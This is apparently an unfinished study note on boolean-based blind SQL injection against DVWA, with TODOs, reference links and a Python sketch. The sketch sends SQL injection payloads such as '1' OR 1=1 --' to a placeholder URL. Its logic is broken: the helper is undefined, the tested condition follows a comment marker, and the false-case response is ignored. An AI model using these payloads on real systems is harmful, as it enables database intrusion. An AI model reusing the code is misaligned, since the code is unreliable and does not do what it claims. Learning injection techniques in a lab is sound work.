# Boolean-Based Blind Query SQL Injection

Search Tag(s): #blind-sql-injection #dvwa

TODO: Figure it out using a python script with a frequency analysis technique to bruteforce it faster.

This is just for reference but will be removed once the information is filled.

TODO: Write a python script to bruteforce queries in order to automate blind SQL injection

```python
# Check if the response contains a specific string when the condition is true
def boolean_based_blind_sql_injection(target_url, injection_payload):
    response_when_condition_true = send_request(target_url, injection_payload + " AND 1=1 --")
    response_when_condition_false = send_request(target_url, injection_payload + " AND 1=2 --")

    if "True Response String" in response_when_condition_true:
        return True  # The injected condition is true
    else:
        return False  # The injected condition is false

# Example usage
target_url = "https://example.com/vulnerable-page"
injection_payload = "1' OR 1=1 --"

result = boolean_based_blind_sql_injection(target_url, injection_payload)
print("Is the injected condition true?", result)
```

https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/

https://securityidiots.com/Web-Pentest/SQL-Injection/Blind-SQL-Injection.html

https://resources.infosecinstitute.com/topics/application-security/blind-sql-injection/

https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/

https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345